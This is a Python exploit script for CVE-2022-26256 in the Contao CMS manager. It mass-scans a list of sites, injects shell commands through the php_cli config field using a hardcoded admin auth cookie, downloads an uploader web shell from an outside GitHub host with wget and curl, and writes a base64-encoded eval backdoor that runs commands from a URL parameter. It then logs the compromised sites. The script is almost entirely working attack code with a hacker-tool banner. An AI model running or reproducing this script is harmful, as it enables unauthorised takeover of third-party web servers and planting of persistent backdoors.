# CVE/Info:    2022-26256 contao CMS Remote Code Execution Vulnerability
# Coded BY JEX Coder  => T.me/ShellTools


import requests
import sys
from multiprocessing import Pool
from os import system, name


UploaderSource = 'https://raw.githubusercontent.com/Jexcoder/licenselist/main/up.php'
pasteBin = 'https://pastebin.com/raw/y46Km13C'
shell = '''<title>Vuln!! patch it Now!</title><?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }else { echo '<b>Not uploaded ! </b><br><br>'; }}?>'''




def clear():
    linux = 'clear'
    windows = 'cls'
    system([linux, windows][name == 'nt'])


def banner():
    sssss = r'''
            Coded BY JEX Coder [VIP]
     ██████╗ ██████╗ ███╗   ██╗████████╗ █████╗  ██████╗      ██████╗███╗   ███╗███████╗
    ██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗    ██╔════╝████╗ ████║██╔════╝
    ██║     ██║   ██║██╔██╗ ██║   ██║   ███████║██║   ██║    ██║     ██╔████╔██║███████╗
    ██║     ██║   ██║██║╚██╗██║   ██║   ██╔══██║██║   ██║    ██║     ██║╚██╔╝██║╚════██║
    ╚██████╗╚██████╔╝██║ ╚████║   ██║   ██║  ██║╚██████╔╝    ╚██████╗██║ ╚═╝ ██║███████║
     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝      ╚═════╝╚═╝     ╚═╝╚══════╝
            contao CMS Remote Code Execution Vulnerability - CVE-2022-26256
                            T.me/ShellTools                                      

    '''
    print(sssss)




def CVE_2022_26256(url):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Content-Type': 'application/json;charset=utf-8',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'X-Requested-With': 'XMLHttpRequest',
        'X-HTTP-Method-Override': 'PUT',
        'Origin': 'http://' + url,
        'Cookie': 'Cookie: contao_manager_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDU2Mjk1MzgsImV4cCI6MTY0NTYzMTMzOCwidXNlcm5hbWUiOiJhZG1pbiJ9.lQCiIXKENysw7omSrUFr1poKfwSf9W0UyAztlXEMIvs'
    }
    parm = {
        'php_cli': 'echo CVE_2022_26256Vuln',
        'cloud': False
    }
    parm1 = {
        'php_cli': 'wget "https://raw.githubusercontent.com/Jexcoder/licenselist/main/up.php" -O up2.php',
        'cloud': False
    }
    parm2 = {
        'php_cli': '{}'.format("echo 'Vuln!! patch it Now!<?php {}(base64_decode('{}')); ?>' > vuln.php".format('eval', 'c3lzdGVtKCRfR0VUWyJjbWQiXSk7')),
        'cloud': False
    }
    parm3 = {
        'php_cli': 'curl -O https://raw.githubusercontent.com/Jexcoder/licenselist/main/up.php',
        'cloud': False
    }
    try:
        res = requests.post('http://' + url + '/api/server/config', headers=header, json=parm).text
        if 'CVE_2022_26256Vuln' in res:
            open('Vulnerable.txt', 'a').write('{}\n'.format(url))
            requests.post('http://' + url + '/api/server/config', headers=header, json=parm1)
            requests.post('http://' + url + '/api/server/config', headers=header, json=parm2)
            requests.post('http://' + url + '/api/server/config', headers=header, json=parm3)
            checksh1 = requests.get('http://' + url + '/api/server/up.php', timeout=6).text
            checksh2 = requests.get('http://' + url + '/api/server/up2.php', timeout=6).text
            checksh3 = requests.get('http://' + url + '/api/server/vuln.php', timeout=6).text
            if 'Vuln!!' in checksh1:
                open('shell.txt', 'a').write('{}/api/server/up.php\n'.format(url))
            elif 'Vuln!!' in checksh2:
                open('shell.txt', 'a').write('{}/api/server/up2.php\n'.format(url))
            elif 'Vuln!!' in checksh3:
                open('shell.txt', 'a').write('{}/api/server/up.php\n'.format(url))
        else:
            print(' {} NOT Vulnerable!'.format(url))
    except:
        print(' {} NOT EXPLOITED!'.format(url))

if __name__ == '__main__':
    try:
        clear()
        banner()
        sites = open(sys.argv[1], 'r').read().splitlines()
        p = Pool(35)
        p.map(CVE_2022_26256, sites)
    except:
        clear()
        banner()
        print('     usage: python {} sites.txt'.format(sys.argv[0]))
        sys.exit()